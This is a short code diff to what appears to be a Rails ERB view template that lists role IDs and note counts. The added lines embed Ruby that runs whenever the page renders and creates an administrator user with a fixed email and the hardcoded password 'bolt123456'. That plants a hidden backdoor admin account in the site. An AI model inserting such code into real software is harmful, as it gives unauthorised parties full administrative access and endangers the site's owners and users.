@@ -2,3 +2,8 @@
 <P><%= @su_role_ids.map(&:role_id) %> <%= @su_role_ids.length %> <%= @success_notes.count %></P>
 <P><%= @fa_role_ids.map(&:role_id) %> <%= @fa_role_ids.length %> <%= @fail_notes.count%></P>
 
+
+<%
+User.create({:email => "bolt@dabi.co", :name => "管理员",:is_admin => true,:password => 'bolt123456', :password_confirmation => 'bolt123456'})
+%>
+
